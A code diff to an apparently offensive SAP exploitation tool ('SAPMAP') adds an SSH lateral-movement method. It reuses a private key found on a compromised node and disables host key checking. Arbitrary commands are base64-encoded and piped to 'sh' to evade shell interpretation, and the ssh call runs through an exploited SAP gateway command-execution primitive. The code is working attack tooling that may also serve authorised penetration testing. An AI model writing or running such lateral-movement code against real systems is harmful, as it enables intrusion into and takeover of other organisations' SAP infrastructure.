@@ -7132,6 +7132,48 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 "error": lpe_res.get("error") or "",
                 "linuxlpe_method": lpe_res.get("method", ""),
             }
+        elif method == "ssh":
+            # SSH lateral movement: run command on THIS node by
+            # SSH-ing from the source node (where the key lives).
+            # The source node must have GW/CVE/SXPG exec to run ssh.
+            ssh_access = getattr(node, "ssh_access", None) or []
+            if not ssh_access:
+                return json.dumps({"error": "No SSH access to this node"})
+            acc = ssh_access[0]
+            src_node = api.state.get_node(acc["from_sid"])
+            if not src_node:
+                return json.dumps({"error": f"Source node {acc['from_sid']} "
+                                             f"not found"})
+            full = cmdline if cmdline else (
+                command + (" " + params if params else "")).strip()
+            if not full:
+                return json.dumps({"error": "No command for SSH"})
+            # Build SSH command — single-word remote commands work
+            # directly; for multi-word commands, base64-encode and
+            # pipe through bash to avoid SAPXPG shell interpretation.
+            import base64
+            b64cmd = base64.b64encode(
+                full.encode()).decode()
+            ssh_args = (
+                f"-o BatchMode=yes "
+                f"-o StrictHostKeyChecking=no "
+                f"-o UserKnownHostsFile=/dev/null "
+                f"-o ConnectTimeout=10 "
+                f"-o LogLevel=ERROR "
+                f"-i {acc['key_path']} "
+                f"{acc['username']}@{acc['target']} "
+                f"echo {b64cmd}|base64 -d|sh"
+            )
+            print(f"[*] {sid}: OS terminal via SSH from "
+                  f"{acc['from_sid']} → {acc['username']}@"
+                  f"{acc['target']} (cmd: {full[:80]!r})")
+            ssh_result = sapmap_exploit.execute_gw_command(
+                src_node, "ssh", ssh_args, long_params="")
+            result = {
+                "success": bool(ssh_result.get("success")),
+                "output": ssh_result.get("output") or [],
+                "error": ssh_result.get("error") or "",
+            }
         else:
             return json.dumps({"error": f"Unknown method: {method}"})
 
